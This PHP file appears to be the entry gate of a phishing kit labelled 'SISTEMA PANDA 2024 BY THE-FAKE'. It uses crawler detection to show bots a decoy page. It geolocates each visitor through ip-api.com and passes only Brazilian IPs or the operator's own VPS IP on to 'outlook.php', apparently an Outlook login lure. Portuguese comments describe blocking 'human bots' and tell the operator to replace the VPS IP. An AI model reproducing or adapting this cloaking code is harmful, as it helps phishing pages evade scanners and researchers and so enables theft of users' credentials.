<?php 

/* @SISTEMA PANDA 2024 BY THE-FAKE */

// session_start();

// require_once("api/banco.php");



//============================================= BOQUEADOR DE BOTS AVANÇADO

require_once("stop/stop.php");

$CrawlerDetect = new CrawlerDetect;
if($CrawlerDetect->isCrawler()){
 $nome = $CrawlerDetect->getMatches();
 // $query = mysqli_query($conn, "INSERT INTO crawlers_spiders (nome) VALUES ('".$nome."')");
 require_once("htmlBot/index.php");
 exit();
}



//============================================= FUNÇÃO PEGA IP

function getIp(){

    $ip = $_SERVER['REMOTE_ADDR']; 
	
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ip = $_SERVER['HTTP_CLIENT_IP']; 
    }
	else if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
      $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; 
    }
    return $ip;
}
	
function validIP($ip){
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    return true;
} else {
    return false;
}
}

$userIP = getIp();  
$str = validIP($userIP);	
	
if($str){ // ipv4 normal 
 $myip = $userIP;
}
else{ // ipv6 hex (ip de chip)
 $new = json_decode(file_get_contents("https://api.ipify.org?format=json"));
 $myip = $new->ip;
}



//============================================= APENAS IP BR VISUALIZA A PAGINA - BARRA OS BOT HUMANO	
	
$res = json_decode(@file_get_contents("http://ip-api.com/json/$myip"));

if($res->status !== "fail" && $res->countryCode !== "BR" && $myip !== "185.199.108.153"){ // <<---------- TROCAR PELO IP DA SUA VPS
 
 // $pais = $res->country;
 // $query = mysqli_query($conn, "INSERT INTO crawlers_spiders (nome) VALUES ('".$pais."')");
 require_once("htmlBot/index.php");
 exit();
 
}


 require_once("outlook.php"); // <<------- ARQUIVO PRINCIPAL A SER CHAMADO CASO SEJA UM USUARIO

 
?>
